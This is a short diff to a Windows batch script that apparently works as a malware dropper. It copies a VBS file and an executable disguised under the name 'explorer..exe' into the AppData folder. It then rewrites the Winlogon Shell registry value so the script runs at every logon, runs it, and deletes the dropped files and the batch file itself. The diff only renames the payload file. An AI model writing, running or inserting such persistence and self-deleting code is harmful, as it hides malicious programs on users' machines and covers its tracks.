@@ -1,8 +1,8 @@
 copy end.vbs %appdata%\end.vbs
-copy temp54685 %appdata%\explorer..exe
+copy explorer..exe %appdata%\explorer..exe
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d  "explorer.exe, wscript.exe \"%appdata%\end.vbs\"" /f
 wscript.exe "%appdata%\end.vbs"
 del end.vbs
 del hstart.vbs
-del temp54685
+del explorer..exe
 del %0
